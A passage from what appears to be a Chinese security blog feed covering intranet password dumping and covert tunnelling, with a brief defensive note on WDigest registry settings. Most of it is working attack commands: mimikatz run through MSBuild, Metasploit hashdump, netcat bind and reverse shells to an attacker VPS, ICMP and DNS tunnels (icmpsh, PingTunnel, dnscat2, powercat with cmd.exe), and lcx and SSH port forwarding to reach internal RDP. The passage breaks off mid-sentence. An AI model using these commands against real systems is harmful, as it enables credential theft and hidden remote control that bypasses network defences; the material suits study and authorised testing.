class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\msbuild.exe mimikatz.xml<br></code></pre></td></tr></table></figure><p>4..net4.0加载mimikatz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\MSBuild.exe executes-mimikatz.xmlC:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\MSBuild.exe executes-mimikatz.xml<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161135261.png" alt="image-20240107161135261"></p><p><strong>- msf</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">run hashdump<br>hashdump<br>post/windows/gather/credentials/domain_hashdump(获取域<span class="hljs-built_in">hash</span>)<br>use mimikatz<br>wdigest（明文）<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161144776.png" alt="image-20240107161144776"></p><p>实战中抓密码大部分都是直接用msf或c2上的工具抓的吧</p><h2 id="单机抓密码防范方法"><a href="#单机抓密码防范方法" class="headerlink" title="单机抓密码防范方法"></a>单机抓密码防范方法</h2><p>  微软为了防止用户密码在内存种以明文形式泄露，发布了补丁KB2871997,关闭了Wdigest功能。<br>windows server 2012 及以上版本默认关闭Wdigest，使攻击者无法从内存种获取明文密码。Windows server 2012及以下的版本，如果安装了KB2871997,攻击者同样无法获取明文密码。<br>        在日常网络维护中，通过查看注册表项Wdigest，可以判断Wdigest功能的状态。如果该项的值为1，用户下次登录时，攻击者就能使用工具获取明文密码。应该确保该项的值为0，使用户明文密码不会出现在内存中。</p><p>在命令行环境中开启或关闭Wdigest Auth,有如下两种方法<br>1.reg add</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在注册表中添加一个键值，将其设置为0，电脑注销后,windows将不会把密码明文存储在内存中</span><br>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f <br><br><span class="hljs-comment">#在注册表中添加一个键值，将其设置为1，windows会把密码明文存储在内存中</span><br>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br><br><span class="hljs-comment">#键值是否添加成功</span><br>reg query HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential <span class="hljs-comment">#查询</span><br></code></pre></td></tr></table></figure><p>2.powershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启wdigest Auth</span><br>Set-ItemProperty -Path  HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential -Type DWORD -Value 1<br><br><span class="hljs-comment">#关闭wdigest Auth</span><br>Set-ItemProperty -Path  HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential -Type DWORD -Value 0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>密码抓取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网隧道隐藏</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="隐藏通信隧道"><a href="#隐藏通信隧道" class="headerlink" title="隐藏通信隧道"></a><strong>隐藏通信隧道</strong></h2><p><strong>1.1 隐藏通信隧道基础知识</strong></p><p>在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。<br>常用的隧道列举如下：</p><ul><li>网络层：IPv6隧道、IMCP隧道、GRE隧道</li><li>传输层：TCP隧道、UDP隧道、常规端口转发</li><li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li></ul><p><strong>1.2 判断内网的连通性</strong><br>判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议（TCP、HTTP、DNS、ICMP等)及端口通信的情况。常见的允许流量流出的端口有80、8080、443、53、110、123等。<br>常用的内网连通性判断方法如下</p><ul><li>ICMP协议</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping &lt;ip或 域名&gt;<br></code></pre></td></tr></table></figure><ul><li>TCP协议<br>netcat(简称nc)被誉为网络安全界的“瑞士军刀”，是一个短小精悍的工具，通过使用TCP或UDP协议的网络连接读写数据。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc  &lt;ip 端口&gt;<br>例如：<br>nc 192.168.1.1 80<br></code></pre></td></tr></table></figure><ul><li>HTTP协议</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl &lt;ip:端口&gt;<br></code></pre></td></tr></table></figure><p>如果远程主机开启了相应的端口，会输出相应的端口信息，如果远程主机没有开启相应的端口，则没有任何提示。</p><ul><li>DNS协议<br>在进行DNS连通性检测时，常用的命令为nslookup和dig</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup 域名<br></code></pre></td></tr></table></figure><p>有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常见的判断方法如下。<br>1.查看网络连接，判断是否存在与其他机器8080(不绝对)等端口的连接(可以尝试运行 “ping -n 1 -a ip”)<br>2.查看内网中是否有主机名类似于”proxy”的机器<br>3.查看IE浏览器的直接代理<br>4.根据pac文件的路径(可能是本地路径，也可能是远程路径），将其下载下来并查看。<br>5.执行如下命令，利用curl工具确认</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl www.baidu.com   //不通<br>curl -x proxy-ip:port wwww.baidu.com    //通<br></code></pre></td></tr></table></figure><p><strong>2.1 网络层隧道技术</strong></p><ul><li>ICMP隧道<br>常用工具有：icmpsh、PingTunnel、icmptunnel、powershell icmp等<br>1.icmpsh<br>因为icmpsh工具要代替系统本身的Ping命令的应答程序，所有需要输入如下命令来关闭本地系统的icmp应答（如果需要恢复，设置为0），否则shell的运行不稳定</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl -w net.ipv4.icmp_echo_ignore_all=1<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161726848.png" alt="image-20240107161726848"></p><p>配置环境服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install epel-release<br>yum -y install python-pip<br>pip install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple<br>pip install Impacket -i https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><p>VPS运行：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161736186.png" alt="image-20240107161736186"><br>直接运行run.sh会报错。所以这里运行py的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python icmpsh_m.py &lt;vpsIP&gt; &lt;受控端IP&gt;<br></code></pre></td></tr></table></figure><p>目标主机运行：<br>将icmpsh.exe扔进目标主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\icmpsh.exe -t vps主机IP  <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161743249.png" alt="image-20240107161743249"><br>结果：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161749884.png" alt="image-20240107161749884"><br>项目地址：<a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p><ul><li>Pingtunnel<br>Pingtunnel也是一款常用的隧道工具。可跨平台使用。为避免隧道被滥用，可以为隧道设置密码</li></ul><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161758361.png" alt="image-20240107161758361"></p><p>搭建：下载后解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> PingTunnel<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161806558.png" alt="image-20240107161806558"><br>跳板机运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ptunnel -x shuteer<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161813322.png" alt="image-20240107161813322"><br>攻击机运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./ptunnel -p 192.168.112.37 -lp 1080 -da 10.10.10.30 -dp 3389 -x shuteer<br></code></pre></td></tr></table></figure><pre><code class="hljs">-lp：指定本地监听的端口-p 指定ICMP隧道另一端的IP-da：指定要转发的目标机器的IP-dp：指定要转发的目标机器的端口-x：指定连接密码</code></pre><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161822221.png" alt="image-20240107161822221"></p><p>攻击机连接目标3389端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rdesktop -f  192.168.112.254:1080<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161830177.png" alt="image-20240107161830177"><br>成功连接到目标机</p><p>Pingtunnel工具在windows环境中也可以运行，只不过要在内网的Windows机器上安全wincap类库。</p><p><strong>2.2 传输层隧道技术</strong></p><ul><li>LCX<br>1.内网端口转发<br>lcx工具是一个基于Socket套接字实现的端口转发工具。有windows和Linux两个版本。windows为lcx.exe,liunx版本为portmap。</li></ul><p>在目标机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将目标机上的3389端口的所有数据转发到公网vps的4444端口上</span><br>lcx.exe  -slave &lt;vps主机地址&gt; 4444  127.0.0.1  3389<br><br>portmap -m 3 -h1 127.0.0.1 -p1 33389 -h2 &lt;vps主机地址&gt; -p2 4444<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161844806.png" alt="image-20240107161844806"></p><p>在vps上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将本机 4444端口上监听的所有数据转发到本机的5555端口上</span><br>lcx.exe  -listen 4444 5555<br><br>portmap -m 2 -p1 4444 -h2 &lt;vps主机地址&gt; -p2 5555<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161853593.png" alt="image-20240107161853593"><br>结果：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161904872.png" alt="image-20240107161904872"><br>成功访问到目标3389</p><p>2.本地端口映射<br>如果目标服务器由于防火墙的限制，部分端口(例如3389)的数据无法通过防火墙，可以将目标服务器相应的端口的数据穿透传到防火墙允许的其他端口(例如53）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lcx.exe -tran 53 &lt;目标主机IP地址&gt; 3389<br></code></pre></td></tr></table></figure><ul><li>netcat<br>常用参数:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">-l ： 使用监听模式，管理和控制传入的数据<br>-p : 设置本地主机使用的通信端口<br>-v ： 详细输出<br>-d ：后台模式<br>-e : 程序重定向<br></code></pre></td></tr></table></figure></li></ul><p>1.获取shell<br>（1）正向shell<br>在目标主机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 4444 -e /bin/sh     //linux<br>nc -lvp 4444 -e c:\windows\system32\cmd.exe      //windows<br></code></pre></td></tr></table></figure><p>在vps上执行：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161919507.png" alt="image-20240107161919507"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;目标主机IP&gt;  4444<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161927286.png" alt="image-20240107161927286"><br>（2).反向shell<br>在目标机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;vps主机IP&gt; 9999 -e /bin/sh      //linux<br>nc &lt;vps主机IP&gt; 9999 -e c:\windows\system32\cmd.exe      //windows<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161935998.png" alt="image-20240107161935998"></p><p>在vps上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 9999<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162000025.png" alt="image-20240107162000025"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162013928.png" alt="image-20240107162013928"><br>2.nc代理<br>在这里插入图片描述</p><p>在kali中访问到10.10.10.12<br>在kali中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 3333<br></code></pre></td></tr></table></figure><p>在内网主机中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp  3333 -e c:\windows\system32\cmd.exe<br></code></pre></td></tr></table></figure><p>在web服务器中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -v 192.168.43.254 3333 -c <span class="hljs-string">&quot;nc -v 10.10.10.12 3333&quot;</span><br></code></pre></td></tr></table></figure><p>由于我环境问题就不演示了，在实战中也基本不会用到，了解就行了</p><p><strong>2.3应用层隧道技术</strong><br>常用的隧道协议有ssh、htto\https和dns。</p><ul><li>DNS协议:<br>首先，需要知道当前服务器是否允许内部的DNS解析外部的域名，也就是要测试DNS的连通性。<br>输入如下命令查看当前内部域名及IP地址：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#linux</span><br><span class="hljs-built_in">cat</span> /etc/resolv.conf | grep -v <span class="hljs-string">&#x27;#&#x27;</span><br><span class="hljs-comment">#windows</span><br>nslookup 内部的域名<br></code></pre></td></tr></table></figure><p>能够通过内部dns服务器解析外部域名，这意味着可以使用DNS隧道隐蔽通信。<br>（1）dnscat2<br>dnscat2工具的服务端是由ruby语言编写，而客户端是由c语言编写。现在也有powershell版。<br>它可以用自己的本身的客户端也可以用powercat作为客户端(powecat可以说是nc的powershell版)</p><p>使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。</p><ul><li>直连模式：客户端直接指向IP地址的DNS服务器发起DNS解析请求。</li><li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器，与直连相比，中继模式的速度较慢。<br>服务端：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#启动</span><br>ruby./dnscat2.rb abc.com --secret=123456   <span class="hljs-comment">#方式1【常用】</span><br>ruby./dnscat2.rb --dns server=127.0.0.1,port=53,<span class="hljs-built_in">type</span>=TXT --secret=123456   <span class="hljs-comment">#方式2</span><br>ruby./dnscat2.rb abc.com --secret=123456 --security=open --no-cache   <span class="hljs-comment">#方式3</span><br>ruby ./dnscat2.rb  <span class="hljs-comment">#方式4</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#命令详解</span><br>-c : 加密通信<br>-e ：规定安全级别，<span class="hljs-string">&#x27;open&#x27;</span>表示服务端允许客户端不进行加密<br>--no-cache : 禁止缓存。<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162126093.png" alt="image-20240107162126093"></p><p>客户端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnscat --secret=123456 abc.com    <span class="hljs-comment">#对应 方式1、3</span><br>dnscat --dns server=&lt;your dnscat2 server ip&gt;,port=553,<span class="hljs-built_in">type</span>=TXT   <span class="hljs-comment">#对应 方式2，注意使用--dns选项时，port不可省，否则可能连不上</span><br>./dnscat --dns=server=192.168.43.254,port=53 <span class="hljs-comment">#对应方式4</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162132983.png" alt="image-20240107162132983"><br>结果：<br>可以看见已经接收到一个session<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162141958.png" alt="image-20240107162141958"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162737654.png" alt="image-20240107162737654"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162800390.png" alt="image-20240107162800390"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162808908.png" alt="image-20240107162808908"><br>在这里就可以执行命令操作了<br>（2)dnscat+powercat<br>客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\powercat.ps1<br>powercat -c 192.168.43.254 -p 53 -dns aaa.com -e cmd.exe<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162839444.png" alt="image-20240107162839444">服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby dnscat2.rb aaa.com -e open --no-cache<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162848940.png" alt="image-20240107162848940">收到session</p><p>powercat 也可像nc哪像使用，使用方法都差不多。</p><p>详细学习请参考：<a href="https://blog.csdn.net/localhost01/article/details/86591685">https://blog.csdn.net/localhost01/article/details/86591685</a></p><ul><li>ssh协议：<br>创建ssh隧道的常用参数：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">-C ： 压缩传输，提高传输速度。<br>-f ： 将ssh传输转入后台执行，不占用当前的shell。<br>-N ：建立默认连接（建立了连接，但是看不到具体会话）。<br>-g ：允许远程主机连接本地用于转发的端口。<br>-L : 本地端口转发。<br>-R ： 远程端口转发。<br>-D ： 动态转发(socks代理）。<br>-P ：指定ssh端口。<br></code></pre></td></tr></table></figure><p>（1）本地转发<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162858746.png" alt="image-20240107162858746"><br>测试目标：跳板机为跳板访问windows2008  3389端口<br>将内网windows主机3389端口映射到攻击机本地端口上。在访问这个本地端口就可以访问目标机的3389端口了<br>攻击执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -L 1111:10.10.10.30:3389 root@192.168.43.37<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162908403.png" alt="image-20240107162908403">这里要输入跳板机的登录密码<br>成功之后查看本地1111端口是否已经连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -tulnp | grep <span class="hljs-string">&quot;1111&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162920094.png" alt="image-20240107162920094"></p><p>在kali中执行 rdesktop 127.0.0.1:1111<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162929610.png" alt="image-20240107162929610"><br>映射成功</p><p>ssh本地端口映射可以将本地(客户机)的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过ssh隧道传输到远端的对应端口。</p><p>（2)远程转发</p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162939349.png" alt="image-20240107162939349"></p><p>web服务器中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -R 3333:10.10.10.30:3389 root@192.168.43.254<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162948404.png" alt="image-20240107162948404"><br>kali中输入  redesktop 127.0.0.1:3333<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107162956663.png" alt="image-20240107162956663"><br>成功建立连接</p><p>本地端口转发是将远程主机某个端口的数据转发到本地机器的指定端口。远程端口转发则是在远程主机上监听一个端口，所有访问这个远程服务器指定端口的数据都会通过ssh隧道传输到本地的对应端口。</p><p>（3）动态转发<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163716465.png" alt="image-20240107163716465"><br>在kali中执行如下命令，建立一个动态的socks 